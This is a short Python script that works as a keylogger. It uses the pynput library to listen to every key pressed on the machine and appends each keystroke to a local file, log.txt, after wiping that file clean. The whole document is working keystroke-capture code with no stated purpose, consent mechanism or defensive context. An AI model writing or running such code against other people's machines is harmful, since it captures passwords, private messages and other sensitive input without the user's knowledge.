from pynput.keyboard import Key, Listener

with open("log.txt", 'w') as file:
    file.truncate(0)
    file.close()


def press(key):
    with open("log.txt", 'a') as file:
        if key == Key.space:
            file.write(' ')
        else:
            file.write(str(key))


with Listener(on_press=press) as listener:
    listener.join()

